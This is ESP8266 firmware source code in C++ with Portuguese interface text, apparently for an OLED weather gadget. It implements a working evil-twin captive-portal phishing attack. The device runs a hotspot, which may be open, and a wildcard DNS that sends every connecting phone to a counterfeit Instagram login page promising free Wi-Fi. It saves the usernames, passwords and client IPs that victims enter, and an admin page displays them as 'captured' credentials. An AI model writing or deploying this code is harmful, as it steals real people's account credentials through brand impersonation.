#include "wifi_portal.h"

#include <ArduinoJson.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <LittleFS.h>
#include <time.h>

#include "app_state.h"

namespace
{
  constexpr byte DNS_PORT = 53;
  constexpr const char *capturedCredentialsPath = "/captured_credentials.json";
  DNSServer dnsServer;

  void applyCaptivePortalDnsState()
  {
    dnsServer.stop();

    if (captivePortalEnabled)
    {
      dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    }
  }

  String escapeHtml(const String &value)
  {
    String escaped;

    for (size_t i = 0; i < value.length(); i++)
    {
      char c = value[i];

      if (c == '&')
        escaped += "&amp;";
      else if (c == '<')
        escaped += "&lt;";
      else if (c == '>')
        escaped += "&gt;";
      else if (c == '"')
        escaped += "&quot;";
      else
        escaped += c;
    }

    return escaped;
  }

  void loadWiFiConfig()
  {
    if (!LittleFS.exists(wifiConfigPath))
    {
      return;
    }

    File file = LittleFS.open(wifiConfigPath, "r");
    if (!file)
    {
      return;
    }

    JsonDocument doc;
    DeserializationError error = deserializeJson(doc, file);
    file.close();

    if (error)
    {
      return;
    }

    wifiSsid = doc["ssid"] | wifiSsid;
    wifiPassword = doc["password"] | wifiPassword;
    apSsid = doc["ap_ssid"] | apSsid;
    apPassword = doc["ap_password"] | apPassword;
    apOpen = doc["ap_open"] | apOpen;
    weatherUpdateIntervalMs = doc["weather_interval_ms"] | weatherUpdateIntervalMs;
    screenChangeIntervalMs = doc["screen_change_ms"] | screenChangeIntervalMs;
    timezoneOffsetHours = doc["timezone_offset_hours"] | timezoneOffsetHours;
    oledBrightness = doc["oled_brightness"] | oledBrightness;
    captivePortalEnabled = doc["captive_portal_enabled"] | captivePortalEnabled;
  }

  bool saveWiFiConfig()
  {
    JsonDocument doc;
    doc["ssid"] = wifiSsid;
    doc["password"] = wifiPassword;
    doc["ap_ssid"] = apSsid;
    doc["ap_password"] = apPassword;
    doc["ap_open"] = apOpen;
    doc["weather_interval_ms"] = weatherUpdateIntervalMs;
    doc["screen_change_ms"] = screenChangeIntervalMs;
    doc["timezone_offset_hours"] = timezoneOffsetHours;
    doc["oled_brightness"] = oledBrightness;
    doc["captive_portal_enabled"] = captivePortalEnabled;

    File file = LittleFS.open(wifiConfigPath, "w");
    if (!file)
    {
      return false;
    }

    bool ok = serializeJson(doc, file) > 0;
    file.close();
    return ok;
  }

  unsigned long parseULongBounded(const String &raw, unsigned long minValue, unsigned long maxValue, unsigned long fallback)
  {
    if (raw.length() == 0)
    {
      return fallback;
    }

    unsigned long value = strtoul(raw.c_str(), nullptr, 10);
    if (value < minValue)
      return minValue;
    if (value > maxValue)
      return maxValue;
    return value;
  }

  int parseIntBounded(const String &raw, int minValue, int maxValue, int fallback)
  {
    if (raw.length() == 0)
    {
      return fallback;
    }

    long value = strtol(raw.c_str(), nullptr, 10);
    if (value < minValue)
      return minValue;
    if (value > maxValue)
      return maxValue;
    return static_cast<int>(value);
  }

  void applyDisplayAndTimeSettings()
  {
    display.ssd1306_command(SSD1306_SETCONTRAST);
    display.ssd1306_command(oledBrightness);
    configTime(timezoneOffsetHours * 3600, 0, "pool.ntp.org");
  }

  void connectStationWiFi()
  {
    lastConnectAttemptAt = millis();
    WiFi.begin(wifiSsid.c_str(), wifiPassword.c_str());

    unsigned long startedAt = millis();

    while (WiFi.status() != WL_CONNECTED && millis() - startedAt < 15000)
    {
      delay(300);
    }
  }

  String wifiStatusToText(wl_status_t status)
  {
    if (status == WL_CONNECTED)
      return "Conectado";
    if (status == WL_NO_SSID_AVAIL)
      return "SSID nao encontrado";
    if (status == WL_CONNECT_FAILED)
      return "Falha de autenticacao";
    if (status == WL_CONNECTION_LOST)
      return "Conexao perdida";
    if (status == WL_IDLE_STATUS)
      return "Conectando";
    if (status == WL_DISCONNECTED)
      return "Desconectado";
    return "Status desconhecido";
  }

  void startHotspot()
  {
    if (apSsid.length() == 0)
    {
      apSsid = "OLED-" + String(ESP.getChipId(), HEX);
    }

    WiFi.softAPdisconnect(true);
    delay(100);

    bool apStarted = false;

    if (apOpen)
    {
      apStarted = WiFi.softAP(apSsid.c_str(), nullptr, 1, false, 4);
    }
    else
    {
      apStarted = WiFi.softAP(apSsid.c_str(), apPassword.c_str(), 1, false, 4);
    }

    if (!apStarted)
    {
      WiFi.softAP(apSsid.c_str());
    }

    applyCaptivePortalDnsState();
  }

  void handleCaptiveRedirect()
  {
    if (!captivePortalEnabled)
    {
      server.send(404, "text/plain; charset=utf-8", "Captive portal desativado");
      return;
    }

    server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString() + "/", true);
    server.send(302, "text/plain", "");
  }

  bool appendCapturedCredential(const String &username, const String &password)
  {
    JsonDocument doc;

    if (LittleFS.exists(capturedCredentialsPath))
    {
      File existing = LittleFS.open(capturedCredentialsPath, "r");
      if (existing)
      {
        DeserializationError error = deserializeJson(doc, existing);
        existing.close();

        if (error || !doc.is<JsonArray>())
        {
          doc.clear();
        }
      }
    }

    if (!doc.is<JsonArray>())
    {
      doc.to<JsonArray>();
    }

    JsonArray entries = doc.as<JsonArray>();
    JsonObject entry = entries.add<JsonObject>();

    entry["username"] = username;
    entry["password"] = password;
    entry["captured_at_ms"] = millis();
    entry["client_ip"] = server.client().remoteIP().toString();

    while (entries.size() > 40)
    {
      entries.remove(0);
    }

    File out = LittleFS.open(capturedCredentialsPath, "w");
    if (!out)
    {
      return false;
    }

    bool ok = serializeJson(doc, out) > 0;
    out.close();
    return ok;
  }

  bool deleteCapturedCredentialByIndex(size_t index)
  {
    if (!LittleFS.exists(capturedCredentialsPath))
    {
      return false;
    }

    File file = LittleFS.open(capturedCredentialsPath, "r");
    if (!file)
    {
      return false;
    }

    JsonDocument doc;
    DeserializationError error = deserializeJson(doc, file);
    file.close();

    if (error || !doc.is<JsonArray>())
    {
      return false;
    }

    JsonArray entries = doc.as<JsonArray>();
    if (index >= entries.size())
    {
      return false;
    }

    entries.remove(index);

    File out = LittleFS.open(capturedCredentialsPath, "w");
    if (!out)
    {
      return false;
    }

    bool ok = serializeJson(doc, out) > 0;
    out.close();
    return ok;
  }

  bool clearCapturedCredentials()
  {
    JsonDocument doc;
    doc.to<JsonArray>();

    File out = LittleFS.open(capturedCredentialsPath, "w");
    if (!out)
    {
      return false;
    }

    bool ok = serializeJson(doc, out) > 0;
    out.close();
    return ok;
  }

  String buildCapturedCredentialsTable()
  {
    if (!LittleFS.exists(capturedCredentialsPath))
    {
      return "<p class='muted'>Nenhuma credencial capturada ainda.</p>";
    }

    File file = LittleFS.open(capturedCredentialsPath, "r");
    if (!file)
    {
      return "<p class='muted'>Falha ao abrir o arquivo de credenciais.</p>";
    }

    JsonDocument doc;
    DeserializationError error = deserializeJson(doc, file);
    file.close();

    if (error || !doc.is<JsonArray>())
    {
      return "<p class='muted'>Arquivo de credenciais vazio ou invalido.</p>";
    }

    JsonArray entries = doc.as<JsonArray>();
    if (entries.size() == 0)
    {
      return "<p class='muted'>Nenhuma credencial capturada ainda.</p>";
    }

    String html;
    html += "<div style='display:flex;flex-direction:column;gap:12px;margin-top:12px'>";

    for (size_t i = entries.size(); i > 0; i--)
    {
      JsonObject item = entries[i - 1];
      String username = item["username"] | "";
      String password = item["password"] | "";
      String ip = item["client_ip"] | "-";
      unsigned long capturedAt = item["captured_at_ms"] | 0;
      size_t entryIndex = i - 1;

      html += "<div style='background:#1f1f1f;border-left:4px solid #00a6ff;padding:16px;border-radius:8px'>";
      html += "<div style='display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:12px'>";

      html += "<div style='background:#262626;padding:12px;border-radius:6px;border-left:3px solid #00a6ff'>";
      html += "<span style='color:#aaa;font-size:11px;text-transform:uppercase;letter-spacing:0.5px'>Usuário</span>";
      html += "<div style='color:#00a6ff;font-size:14px;font-weight:bold;margin-top:6px;word-break:break-all'>" + escapeHtml(username) + "</div>";
      html += "</div>";

      html += "<div style='background:#262626;padding:12px;border-radius:6px;border-left:3px solid #ff7675'>";
      html += "<span style='color:#aaa;font-size:11px;text-transform:uppercase;letter-spacing:0.5px'>Senha</span>";
      html += "<div style='color:#ff7675;font-size:14px;font-weight:bold;margin-top:6px;word-break:break-all'>" + escapeHtml(password) + "</div>";
      html += "</div>";

      html += "</div>";
      html += "<div style='display:flex;justify-content:space-between;align-items:center;gap:12px'>";
      html += "<div style='flex:1;display:flex;gap:16px;font-size:12px'>";
      html += "<div><span style='color:#aaa'>IP:</span> <span style='color:#58d68d'>" + escapeHtml(ip) + "</span></div>";
      html += "<div><span style='color:#aaa'>Capturado:</span> <span style='color:#ffb347'>" + String(capturedAt) + " ms</span></div>";
      html += "</div>";
      html += "<form method='post' action='/credentials/delete' onsubmit=\"return confirm('Apagar este login?')\" style='margin:0'>";
      html += "<input type='hidden' name='index' value='" + String(entryIndex) + "'>";
      html += "<button type='submit' style='padding:8px 14px;border-radius:6px;border:0;background:#8b2d2d;color:#fff;cursor:pointer;font-weight:bold;white-space:nowrap;font-size:12px'>🗑️ Apagar</button>";
      html += "</form>";
      html += "</div>";
      html += "</div>";
    }

    html += "</div>";
    return html;
  }

  void handleDeleteCapturedCredential()
  {
    if (!server.hasArg("index"))
    {
      server.send(400, "text/plain; charset=utf-8", "Indice obrigatorio");
      return;
    }

    String rawIndex = server.arg("index");
    for (size_t i = 0; i < rawIndex.length(); i++)
    {
      if (!isDigit(rawIndex[i]))
      {
        server.send(400, "text/plain; charset=utf-8", "Indice invalido");
        return;
      }
    }

    size_t index = static_cast<size_t>(strtoul(rawIndex.c_str(), nullptr, 10));
    bool ok = deleteCapturedCredentialByIndex(index);

    if (!ok)
    {
      server.send(400, "text/plain; charset=utf-8", "Falha ao apagar credencial");
      return;
    }

    server.sendHeader("Location", "/admin", true);
    server.send(303, "text/plain", "");
  }

  void handleClearCapturedCredentials()
  {
    bool ok = clearCapturedCredentials();

    if (!ok)
    {
      server.send(500, "text/plain; charset=utf-8", "Falha ao limpar credenciais");
      return;
    }

    server.sendHeader("Location", "/admin", true);
    server.send(303, "text/plain", "");
  }

  String buildWifiSelectOptions()
  {
    String options;
    int networkCount = WiFi.scanNetworks();

    if (networkCount <= 0)
    {
      options += "<option value=''>Nenhuma rede encontrada</option>";
      return options;
    }

    for (int i = 0; i < networkCount; i++)
    {
      String ssid = WiFi.SSID(i);
      if (ssid.length() == 0)
      {
        continue;
      }

      int rssi = WiFi.RSSI(i);
      String selected = ssid == wifiSsid ? " selected" : "";
      options += "<option value='" + escapeHtml(ssid) + "'" + selected + ">";
      options += escapeHtml(ssid) + " (" + String(rssi) + " dBm)";
      options += "</option>";
    }

    WiFi.scanDelete();
    return options;
  }

  void handleCredentialCapturePage()
  {
    if (!captivePortalEnabled)
    {
      server.sendHeader("Location", "/admin", true);
      server.send(302, "text/plain", "");
      return;
    }

    String page = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
      <title>Instagram • Login for Free WiFi</title>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <style>
        body {
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
          margin: 0;
          padding: 0;
          background: #fafafa;
        }
        .main {
          display: flex;
          flex-direction: column;
          align-items: center;
          margin-top: 12px;
        }
        .container {
          width: 350px;
          background: white;
          border: 1px solid #dbdbdb;
          border-radius: 1px;
          padding: 10px 0;
          margin-bottom: 10px;
        }
        .logo {
          margin: 22px auto 12px;
          text-align: center;
        }
        .instagram-logo {
          font-family: 'Segoe UI', Arial, sans-serif;
          font-size: 40px;
          font-weight: bold;
          color: #262626;
          background: -webkit-linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
          -webkit-background-clip: text;
          background-clip: text;
          -webkit-text-fill-color: transparent;
          display: inline-block;
          margin: 10px auto;
          letter-spacing: -1px;
        }
        .wifi-message {
          text-align: center;
          background: #fff;
          padding: 15px;
          margin: 10px auto;
          width: 350px;
          border: 1px solid #dbdbdb;
          border-radius: 1px;
          color: #262626;
          font-size: 14px;
          line-height: 1.5;
        }
        .wifi-message h3 {
          color: #0095f6;
          margin: 0 0 10px 0;
          font-size: 16px;
        }
        form {
          padding: 0 40px;
        }
        input {
          width: 100%;
          background: #fafafa;
          padding: 9px 8px;
          margin: 6px 0;
          border: 1px solid #dbdbdb;
          border-radius: 3px;
          box-sizing: border-box;
          font-size: 14px;
          color: #262626;
        }
        input:focus {
          border-color: #a8a8a8;
          outline: none;
        }
        button {
          width: 100%;
          background: #0095f6;
          color: white;
          padding: 7px 16px;
          border: none;
          border-radius: 4px;
          font-weight: 600;
          font-size: 14px;
          cursor: pointer;
          margin: 8px 0;
        }
        button:hover {
          background: #0086e0;
        }
        .divider {
          display: flex;
          align-items: center;
          margin: 10px 0 18px;
        }
        .line {
          flex-grow: 1;
          height: 1px;
          background: #dbdbdb;
        }
        .or {
          color: #8e8e8e;
          font-size: 13px;
          font-weight: 600;
          margin: 0 18px;
        }
        .footer {
          width: 350px;
          text-align: center;
          padding: 20px;
        }
        .footer a {
          color: #00376b;
          text-decoration: none;
          font-size: 12px;
        }
        .footer span {
          color: #8e8e8e;
          font-size: 12px;
          margin: 0 8px;
        }
      </style>
    </head>
    <body>
      <div class="main">
        <div class="wifi-message">
          <h3>Free WiFi Access</h3>
          <p>Login with Instagram to get 4 hours of free high-speed internet access. Connect with friends while enjoying our complimentary WiFi service.</p>
        </div>

        <div class="container">
          <div class="logo">
            <div class="instagram-logo">Instagram</div>
          </div>
          <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="off" autocapitalize="off">
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>

            <div class="divider">
              <div class="line"></div>
              <div class="or">OR</div>
              <div class="line"></div>
            </div>
          </form>
        </div>

        <div class="container" style="text-align: center; padding: 20px;">
          <span style="color: #262626; font-size: 14px;">Don't have an account? </span>
          <a href="#" style="color: #0095f6; font-weight: 600; text-decoration: none; font-size: 14px;">Sign up</a>
        </div>

        <div class="footer">
          <a href="#">About</a><span>•</span>
          <a href="#">Help</a><span>•</span>
          <a href="#">Privacy</a><span>•</span>
          <a href="#">Terms</a>
        </div>
      </div>
    </body>
    </html>
  )rawliteral";

    server.send(200, "text/html; charset=utf-8", page);
  }

  void handleCredentialSubmit()
  {
    String username = server.arg("username");
    String password = server.arg("password");

    if (username.length() == 0 || password.length() == 0)
    {
      server.send(400, "text/plain; charset=utf-8", "Usuario e senha sao obrigatorios");
      return;
    }

    bool saved = appendCapturedCredential(username, password);

    String page = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
      <title>Instagram • Login for Free WiFi</title>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <meta http-equiv="refresh" content="3;url=/">
      <style>
        body {
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
          margin: 0;
          padding: 0;
          background: #fafafa;
          display: flex;
          align-items: center;
          justify-content: center;
          min-height: 100vh;
        }
        .container {
          width: 350px;
          background: white;
          border: 1px solid #dbdbdb;
          border-radius: 1px;
          padding: 40px 20px;
          text-align: center;
          box-shadow: 0 4px 12px rgba(0,0,0,0.05);
        }
        .instagram-logo {
          font-family: 'Segoe UI', Arial, sans-serif;
          font-size: 36px;
          font-weight: bold;
          background: -webkit-linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
          -webkit-background-clip: text;
          background-clip: text;
          -webkit-text-fill-color: transparent;
          margin-bottom: 20px;
        }
        .success {
          color: #0095f6;
          font-size: 18px;
          margin: 15px 0;
        }
        .error {
          color: #ed4956;
          font-size: 18px;
          margin: 15px 0;
        }
        p {
          color: #8e8e8e;
          font-size: 14px;
          line-height: 1.5;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="instagram-logo">Instagram</div>

        )rawliteral";

    if (saved)
    {
      page += R"rawliteral(
        <div class="success">✅ Acesso recebido com sucesso!</div>
        <br>Redirecionando em 3 segundos...</p>
    )rawliteral";
    }
    else
    {
      page += R"rawliteral(
        <div class="error">❌ Falha ao registrar dados</div>
        <br>Tente novamente.</p>
    )rawliteral";
    }

    page += R"rawliteral(
      </div>
    </body>
    </html>
  )rawliteral";

    server.send(200, "text/html; charset=utf-8", page);
  }

  void handleAdminPortal()
  {
    String wifiOptions = buildWifiSelectOptions();
    wl_status_t staStatus = WiFi.status();
    bool staConnected = staStatus == WL_CONNECTED;
    String credentialsTable = buildCapturedCredentialsTable();

    String page;
    page += "<!doctype html><html><head><meta charset='utf-8'>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<style>body{font-family:Arial,sans-serif;background:#111;color:#eee;max-width:560px;margin:0 auto;padding:20px}input,select,button{width:100%;padding:12px;margin:8px 0;border-radius:10px;border:0}input,select{background:#222;color:#fff}button{background:#00a6ff;color:#fff;font-weight:bold} .card{background:#1b1b1b;padding:18px;border-radius:16px;margin-bottom:12px} .muted{color:#aaa;font-size:14px} .secondary{background:#2a2a2a} .danger{background:#8b2d2d}.ok{color:#58d68d}.bad{color:#ff7675}</style></head><body>";
    page += "<div class='card'><h2>Configurar Wi-Fi</h2>";
    page += "<p class='muted'>Conectado ao hotspot: " + apSsid + "</p>";
    page += "<p class='muted'>Seguranca AP: ";
    page += apOpen ? "Aberto (sem senha)" : "WPA2";
    page += "</p>";
    page += "<p class='muted'>Status STA: ";
    page += staConnected ? "<span class='ok'>Conectado</span>" : "<span class='bad'>" + wifiStatusToText(staStatus) + "</span>";
    page += "</p>";
    page += "<p class='muted'>IP AP: " + WiFi.softAPIP().toString() + "</p>";
    page += "<p class='muted'>IP STA: ";
    page += staConnected ? WiFi.localIP().toString() : "-";
    page += "</p>";
    page += "<form method='post' action='/save'>";
    page += "<select name='ssid' required>";
    page += wifiOptions;
    page += "</select>";
    page += "<input name='password' placeholder='Senha do Wi-Fi' type='password' value='" + escapeHtml(wifiPassword) + "'>";
    page += "<h3>Hotspot do dispositivo</h3>";
    page += "<label>Nome do hotspot (AP)</label>";
    page += "<input name='ap_ssid' maxlength='31' value='" + escapeHtml(apSsid) + "'>";
    page += "<label><input name='ap_open' type='checkbox'";
    page += apOpen ? " checked" : "";
    page += "> Hotspot aberto (sem senha)</label>";
    page += "<input name='ap_password' placeholder='Senha AP (minimo 8 caracteres)' type='password' value='" + escapeHtml(apPassword) + "'>";
    page += "<h3>Ajustes do Sistema</h3>";
    page += "<label>Intervalo do clima (segundos)</label>";
    page += "<input name='weather_sec' type='number' min='10' max='3600' value='" + String(weatherUpdateIntervalMs / 1000) + "'>";
    page += "<label>Fuso horario (UTC, ex: -3)</label>";
    page += "<input name='tz' type='number' min='-12' max='14' value='" + String(timezoneOffsetHours) + "'>";
    page += "<label>Brilho OLED (0-255)</label>";
    page += "<input name='brightness' type='number' min='0' max='255' value='" + String(oledBrightness) + "'>";
    page += "<label>Troca de tela (segundos)</label>";
    page += "<input name='screen_sec' type='number' min='2' max='120' value='" + String(screenChangeIntervalMs / 1000) + "'>";
    page += "<label><input name='captive_portal' type='checkbox'";
    page += captivePortalEnabled ? " checked" : "";
    page += "> Ativar captive portal</label>";
    page += "<button type='submit'>Salvar e conectar</button></form>";
    page += "<form method='get' action='/admin'><button class='secondary' type='submit'>Atualizar lista de redes</button></form>";
    page += "<form method='get' action='/status'><button class='secondary' type='submit'>Ver status completo</button></form>";
    page += "<p class='muted'>API: /api/status</p>";
    page += "</div>";
    page += "<div class='card'><h3>Usuarios e senhas capturados</h3>";
    page += "<form method='post' action='/credentials/clear' onsubmit=\"return confirm('Apagar TODOS os logins salvos?')\'>";
    page += "<button class='danger' type='submit'>Apagar todos os logins</button></form>";
    page += credentialsTable;
    page += "</div></body></html>";

    server.send(200, "text/html; charset=utf-8", page);
  }

  void handleStatusPage()
  {
    String page;
    page += "<!doctype html><html><head><meta charset='utf-8'>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<style>body{font-family:Arial,sans-serif;background:#0e0f12;color:#f4f4f4;max-width:620px;margin:0 auto;padding:20px} .card{background:#1a1d23;padding:16px;border-radius:14px;margin:10px 0} .label{color:#9aa4b2;font-size:13px} .value{font-size:18px} .ok{color:#53d769} .bad{color:#ff6b6b} a{color:#7cc7ff} button{width:100%;padding:12px;margin-top:10px;border:0;border-radius:10px;background:#2a2f3a;color:#fff}</style>";
    page += "<script>async function r(){try{const s=await fetch('/api/status');const j=await s.json();document.getElementById('sta').innerText=j.sta_status;document.getElementById('staIp').innerText=j.sta_ip;document.getElementById('ap').innerText=j.ap_ssid;document.getElementById('apIp').innerText=j.ap_ip;document.getElementById('clients').innerText=j.ap_clients;document.getElementById('ssid').innerText=j.saved_ssid;document.getElementById('rssi').innerText=j.rssi;document.getElementById('last').innerText=j.last_connect_attempt_age_ms+' ms';document.getElementById('uptime').innerText=j.uptime_ms+' ms';document.getElementById('temp').innerText=j.temperature_c+' C';document.getElementById('screen').innerText=j.active_screen;}catch(e){}}setInterval(r,2000);window.onload=r;</script></head><body>";
    page += "<h2>Status do Servidor Wi-Fi</h2>";
    page += "<div class='card'><div class='label'>STA Status</div><div class='value' id='sta'>-</div><div class='label'>STA IP</div><div class='value' id='staIp'>-</div><div class='label'>RSSI</div><div class='value' id='rssi'>-</div></div>";
    page += "<div class='card'><div class='label'>AP SSID</div><div class='value' id='ap'>-</div><div class='label'>AP IP</div><div class='value' id='apIp'>-</div><div class='label'>Clientes no AP</div><div class='value' id='clients'>-</div></div>";
    page += "<div class='card'><div class='label'>SSID salvo</div><div class='value' id='ssid'>-</div><div class='label'>Ultima tentativa de conexao</div><div class='value' id='last'>-</div><div class='label'>Uptime</div><div class='value' id='uptime'>-</div><div class='label'>Temperatura</div><div class='value' id='temp'>-</div><div class='label'>Tela ativa</div><div class='value' id='screen'>-</div></div>";
    page += "<button onclick=\"location.href='/admin'\">Voltar para configuracao</button>";
    page += "<div class='card'><a href='/api/status'>Abrir JSON de status</a></div></body></html>";

    server.send(200, "text/html; charset=utf-8", page);
  }

  void handleStatusJson()
  {
    JsonDocument doc;
    wl_status_t staStatus = WiFi.status();
    bool staConnected = staStatus == WL_CONNECTED;

    doc["sta_status"] = wifiStatusToText(staStatus);
    doc["sta_connected"] = staConnected;
    doc["sta_ip"] = staConnected ? WiFi.localIP().toString() : String("-");
    doc["rssi"] = staConnected ? String(WiFi.RSSI()) + " dBm" : String("-");
    doc["ap_ssid"] = apSsid;
    doc["ap_open"] = apOpen;
    doc["ap_ip"] = WiFi.softAPIP().toString();
    doc["ap_clients"] = WiFi.softAPgetStationNum();
    doc["saved_ssid"] = wifiSsid;
    doc["last_connect_attempt_ms"] = lastConnectAttemptAt;
    doc["last_connect_attempt_age_ms"] = lastConnectAttemptAt > 0 ? millis() - lastConnectAttemptAt : 0;
    doc["uptime_ms"] = millis();
    doc["temperature_c"] = temp;
    doc["active_screen"] = screen;
    doc["weather_update_interval_ms"] = weatherUpdateIntervalMs;
    doc["screen_change_interval_ms"] = screenChangeIntervalMs;
    doc["timezone_offset_hours"] = timezoneOffsetHours;
    doc["oled_brightness"] = oledBrightness;
    doc["captive_portal_enabled"] = captivePortalEnabled;

    String payload;
    serializeJson(doc, payload);
    server.send(200, "application/json; charset=utf-8", payload);
  }

  void handleSave()
  {
    String newSsid = server.arg("ssid");
    String newPassword = server.arg("password");
    String newApSsid = server.arg("ap_ssid");
    String newApPassword = server.arg("ap_password");
    bool newApOpen = server.hasArg("ap_open");
    bool newCaptivePortalEnabled = server.hasArg("captive_portal");
    unsigned long weatherSec = parseULongBounded(server.arg("weather_sec"), 10, 3600, weatherUpdateIntervalMs / 1000);
    unsigned long screenSec = parseULongBounded(server.arg("screen_sec"), 2, 120, screenChangeIntervalMs / 1000);
    int newTz = parseIntBounded(server.arg("tz"), -12, 14, timezoneOffsetHours);
    int newBrightness = parseIntBounded(server.arg("brightness"), 0, 255, oledBrightness);

    if (newSsid.length() == 0)
    {
      server.send(400, "text/plain; charset=utf-8", "SSID vazio");
      return;
    }

    if (newApSsid.length() == 0)
    {
      newApSsid = "OLED-" + String(ESP.getChipId(), HEX);
    }

    if (!newApOpen && newApPassword.length() < 8)
    {
      server.send(400, "text/plain; charset=utf-8", "Senha do hotspot deve ter no minimo 8 caracteres ou marque hotspot aberto");
      return;
    }

    wifiSsid = newSsid;
    wifiPassword = newPassword;
    apSsid = newApSsid;
    apPassword = newApPassword;
    apOpen = newApOpen;
    weatherUpdateIntervalMs = weatherSec * 1000;
    screenChangeIntervalMs = screenSec * 1000;
    timezoneOffsetHours = newTz;
    oledBrightness = static_cast<uint8_t>(newBrightness);
    captivePortalEnabled = newCaptivePortalEnabled;

    applyDisplayAndTimeSettings();
    bool saved = saveWiFiConfig();
    applyCaptivePortalDnsState();

    String page;
    page += "<!doctype html><html><head><meta charset='utf-8'>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<meta http-equiv='refresh' content='4;url=/status'>";
    page += "<style>body{font-family:Arial,sans-serif;background:#101216;color:#f4f4f4;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:16px}.card{background:#1b1f27;padding:22px;border-radius:16px;max-width:460px;width:100%}.ok{color:#53d769}.bad{color:#ff6b6b}.loader{width:18px;height:18px;border-radius:50%;border:3px solid #4f5d75;border-top-color:#fff;display:inline-block;animation:s 1s linear infinite;vertical-align:middle;margin-right:8px}@keyframes s{to{transform:rotate(360deg)}}</style></head><body>";
    page += "<div class='card'><h3>Salvando configuracao</h3>";
    page += "<p>SSID selecionado: <strong>" + escapeHtml(wifiSsid) + "</strong></p>";
    page += saved ? "<p class='ok'>Dados salvos com sucesso.</p>" : "<p class='bad'>Falha ao salvar no armazenamento.</p>";
    page += "<p><span class='loader'></span>Tentando conectar agora...</p>";
    page += "<p>Voce sera redirecionado para a pagina de status em alguns segundos.</p>";
    page += "<p><a href='/status' style='color:#7cc7ff'>Abrir status agora</a></p></div></body></html>";

    server.send(200, "text/html; charset=utf-8", page);

    startHotspot();
    WiFi.disconnect();
    connectStationWiFi();
  }

  void startConfigPortal()
  {
    server.on("/", HTTP_GET, handleCredentialCapturePage);
    server.on("/login", HTTP_POST, handleCredentialSubmit);
    server.on("/admin", HTTP_GET, handleAdminPortal);
    server.on("/generate_204", HTTP_GET, handleCaptiveRedirect);
    server.on("/gen_204", HTTP_GET, handleCaptiveRedirect);
    server.on("/hotspot-detect.html", HTTP_GET, handleCaptiveRedirect);
    server.on("/ncsi.txt", HTTP_GET, handleCaptiveRedirect);
    server.on("/connecttest.txt", HTTP_GET, handleCaptiveRedirect);
    server.on("/fwlink", HTTP_GET, handleCaptiveRedirect);
    server.on("/status", HTTP_GET, handleStatusPage);
    server.on("/api/status", HTTP_GET, handleStatusJson);
    server.on("/save", HTTP_POST, handleSave);
    server.on("/credentials/delete", HTTP_POST, handleDeleteCapturedCredential);
    server.on("/credentials/clear", HTTP_POST, handleClearCapturedCredentials);
    server.onNotFound([]()
                      {
      if (captivePortalEnabled)
      {
        handleCaptiveRedirect();
        return;
      }

      server.send(404, "text/plain; charset=utf-8", "Rota nao encontrada. Abra /admin"); });
    server.begin();
  }
} // namespace

void initWiFiAndPortal()
{
  LittleFS.begin();
  loadWiFiConfig();

  WiFi.persistent(false);
  WiFi.mode(WIFI_AP_STA);
  delay(100);

  startHotspot();
  startConfigPortal();
  applyDisplayAndTimeSettings();

  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 10);
  display.println("Conectando WiFi...");
  display.display();

  connectStationWiFi();
}

void handlePortalClient()
{
  server.handleClient();

  if (captivePortalEnabled)
  {
    dnsServer.processNextRequest();
  }
}

void setCaptivePortalEnabled(bool enabled)
{
  if (captivePortalEnabled == enabled)
  {
    return;
  }

  captivePortalEnabled = enabled;
  portalToastMessage = enabled ? "Portal ativado" : "Portal desativado";
  portalToastUntil = millis() + 2500;
  applyCaptivePortalDnsState();
  saveWiFiConfig();
}

void toggleCaptivePortalEnabled()
{
  setCaptivePortalEnabled(!captivePortalEnabled);
}
